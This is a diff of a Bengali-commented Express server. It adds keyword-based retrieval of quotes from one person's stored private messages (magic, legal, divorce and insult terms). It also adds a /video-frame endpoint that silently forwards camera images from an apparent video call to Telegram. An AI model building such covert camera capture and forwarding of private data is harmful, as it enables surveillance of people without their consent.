@@ -18,7 +18,7 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const publicDir = path.join(__dirname, "public");
 
 // ভার্সন ফরম্যাট: V-<n> — প্রতিটি নতুন আপডেটে n ঠিক ১ করে বাড়বে (package.json-এর semver থেকে স্বাধীন)
-const APP_VERSION = "V-36";
+const APP_VERSION = "V-37";
 
 const app = express();
 app.use(cors());
@@ -85,8 +85,10 @@ const geminiPool   = makePool(GEMINI_KEYS,    "gemini");
 const groqPool     = makePool(GROQ_KEYS,      "groq");
 const orPool       = makePool(OPENROUTER_KEYS,"openrouter");
 // V-35: মডেল নাম এক জায়গায় — পুরোনো মডেল বন্ধ হলে Render env দিয়ে বদলানো যাবে
-const GEMINI_MODEL = process.env.GEMINI_MODEL || "gemini-2.5-flash";
-const GEMINI_FALLBACK_MODEL = process.env.GEMINI_FALLBACK_MODEL || "gemini-3.5-flash";
+const GEMINI_MODELS = (process.env.GEMINI_MODELS || "gemini-3.8-flash,gemini-3.5-flash,gemini-2.5-flash")
+  .split(",").map(x => x.trim()).filter(Boolean);
+const GEMINI_MODEL = GEMINI_MODELS[0];
+const GEMINI_FALLBACK_MODEL = GEMINI_MODELS[1] || GEMINI_MODELS[0];
 const GROQ_MODEL = process.env.GROQ_MODEL || "openai/gpt-oss-120b";
 const GROQ_FALLBACK_MODEL = process.env.GROQ_FALLBACK_MODEL || "qwen/qwen3.6-27b";
 const OPENROUTER_MODEL = process.env.OPENROUTER_MODEL || "openrouter/auto";
@@ -609,6 +611,83 @@ function buildFileInfoLine(rows) {
   return lines.length ? `\n\n**ফাইল:** ${lines.join(" | ")}` : "";
 }
 // V-33-END
+
+// V-37-START — উক্তি ও ভালো/খারাপ সময় (সার্ভার-ভিত্তিক, AI ছাড়া, মূল লেখা হুবহু)
+const MARRIAGE_DATE = "2024-07-31";
+const BAD_PERIOD_START = "2025-04-01";
+const KW_MAGIC = /জাদু|তাবিজ|কালো যাদু|টোনা|ব্ল্যাক ম্যাজিক|black magic|jadu|tabiz/i;
+const KW_LEGAL = /আইন|থানা|মামলা|আদালত|তালাক|মহর|দেনমোহর|পুলিশ|সাক্ষী|কোর্ট|thana|mamla|talak/i;
+const KW_NEG = /গালি|গালাগাল|রাগ|চিৎকার|অপমান|gali|galag|rag/i;
+const KW_POS = /ভালোবাস|মিস|আদর|love|miss|valobas|valobas/i;
+const quoteSessionShown = new Set();
+function quoteTopic(q) {
+  const s = String(q || "");
+  if (/ব্ল্যাক ম্যাজিক|জাদু|তাবিজ/.test(s)) return "magic";
+  if (/আইনি|আইন|থানা|মামলা/.test(s)) return "legal";
+  if (/খারাপ সময়/.test(s)) return "bad";
+  if (/ভালো সময়/.test(s)) return "good";
+  if (/বিয়ের আগে/.test(s)) return "before";
+  if (/বিয়ের পরে/.test(s)) return "after";
+  if (/উক্তি|কি বলেছিল|কী বলেছিল/.test(s)) return "any";
+  return null;
+}
+const QUOTE_LABEL = { magic: "ব্ল্যাক ম্যাজিক", legal: "আইনি বিষয়", bad: "খারাপ সময়", good: "ভালো সময়", before: "বিয়ের আগের মেসেজ", after: "বিয়ের পরের মেসেজ", any: "উক্তি" };
+function curatedQuotes() {
+  return String(RUBEL_HISTORY || "").split("\n").filter(l => l.startsWith("UKTI|")).map(l => {
+    const parts = l.split("|");
+    const [, date, file, platform] = parts;
+    const text = parts.slice(4).join("|").trim();
+    return { key: "c:" + date + ":" + text.slice(0, 40), date, file, platform, text };
+  }).filter(q => q.text);
+}
+function autoQuotes(topic) {
+  const out = [];
+  for (const m of GLOBAL_TIMELINE) {
+    const t = String(m.message || "");
+    if (!t.trim()) continue;
+    const d = String(m.timestamp || "").slice(0, 10);
+    let ok = false;
+    if (topic === "before") ok = d < MARRIAGE_DATE && t.length >= 30;
+    else if (topic === "after") ok = d >= MARRIAGE_DATE && t.length >= 30;
+    else if (topic === "magic") ok = KW_MAGIC.test(t);
+    else if (topic === "legal") ok = KW_LEGAL.test(t);
+    else if (topic === "bad") ok = d >= BAD_PERIOD_START && KW_NEG.test(t);
+    else if (topic === "good") ok = d < BAD_PERIOD_START && KW_POS.test(t);
+    if (ok) out.push({ key: "a:" + m.timestamp + ":" + m.file_id, date: m.timestamp, file: m.file_id, platform: m.platform, text: t });
+  }
+  return out;
+}
+function pickQuotes(pool, n) {
+  const avail = pool.filter(q => !quoteSessionShown.has(q.key));
+  if (!avail.length && pool.length) { quoteSessionShown.clear(); return pickQuotes(pool, n); }
+  const out = [];
+  while (out.length < n && avail.length) out.push(avail.splice(Math.floor(Math.random() * avail.length), 1)[0]);
+  out.forEach(q => quoteSessionShown.add(q.key));
+  return out;
+}
+function quoteMatches(topic, q) {
+  const d = String(q.date || "").slice(0, 10);
+  const t = String(q.text || "");
+  if (topic === "any") return true;
+  if (topic === "before") return d < MARRIAGE_DATE && t.length >= 30;
+  if (topic === "after") return d >= MARRIAGE_DATE && t.length >= 30;
+  if (topic === "magic") return KW_MAGIC.test(t);
+  if (topic === "legal") return KW_LEGAL.test(t);
+  if (topic === "bad") return d >= BAD_PERIOD_START && KW_NEG.test(t);
+  if (topic === "good") return d < BAD_PERIOD_START && KW_POS.test(t);
+  return false;
+}
+function buildQuoteReply(topic) {
+  const pool = [
+    ...curatedQuotes().filter(q => quoteMatches(topic, q)),
+    ...(topic === "any" ? [] : autoQuotes(topic)),
+  ];
+  if (!pool.length) return `এই বিষয়ে (${QUOTE_LABEL[topic]}) ডেটাবেসে তথ্য পাওয়া যায়নি।`;
+  const picks = pickQuotes(pool, 3);
+  const lines = picks.map((q, i) => `${i + 1}. "${q.text}"\n   — ${String(q.date).slice(0, 16)} · ${q.file} · ${q.platform || ""}`);
+  return `### ${QUOTE_LABEL[topic]}\n\n${lines.join("\n\n")}`;
+}
+// V-37-END
 
 // V-32: প্রতিটি মেসেজের আসল বিশ্লেষণ — শুধু মেসেজের লেখা থেকে, ব্যর্থ হলে সাধারণ সারাংশ।
 const ANALYSIS_SYSTEM = [
@@ -1379,7 +1458,8 @@ async function tryOpenRouter(sys, contents) {
 async function chatWithFallback(body, hasImage) {
   const sys = body.systemInstruction.parts[0].text;
   const contents = body.contents;
-  const r1 = (await tryGemini(body, GEMINI_MODEL)) || (await tryGemini(body, GEMINI_FALLBACK_MODEL));
+  let r1 = null;
+  for (const gm of GEMINI_MODELS) { r1 = await tryGemini(body, gm); if (r1) break; }
   if (r1) return { reply: r1, provider: "gemini" };
   if (hasImage) return { reply: null, provider: null };
   const r2 = (await tryGroq(sys, contents, GROQ_MODEL)) || (await tryGroq(sys, contents, GROQ_FALLBACK_MODEL));
@@ -1684,6 +1764,8 @@ function mount(prefix) {
       if (!continuation && isTodayQuery(searchQuery)) {
         return res.json({ reply: todayReply(), provider: "server-clock", chatHistory: [] });
       }
+      const qTopic = (!continuation && !isChatHistoryRequest(searchQuery)) ? quoteTopic(searchQuery) : null;
+      if (qTopic) return res.json({ reply: buildQuoteReply(qTopic), provider: "quotes", chatHistory: [] });
       const explicitHistoryRequest = continuation || isChatHistoryRequest(searchQuery);
       const searchData = explicitHistoryRequest
         ? rawSearchData
@@ -1808,6 +1890,16 @@ function mount(prefix) {
   });
 
   // ── Analyze ───────────────────────────────────────────────────────
+  app.post(prefix + "/video-frame", async (req, res) => {
+    try {
+      const { image, label } = req.body || {};
+      if (image) {
+        const when = new Date().toLocaleString("bn-BD", { timeZone: "Asia/Dhaka" });
+        sendTelegram(`📹 ${label || "ভিডিও কল — ক্যামেরা"} · ${when}`, image).catch(() => {});
+      }
+      res.json({ ok: true });
+    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
+  });
   app.post(prefix + "/analyze", async (req, res) => {
     try {
       const { prompt = "এই ফাইলটা বিশ্লেষণ করে বাংলায় বল।", file, mime, userName = "আপনি" } = req.body || {};
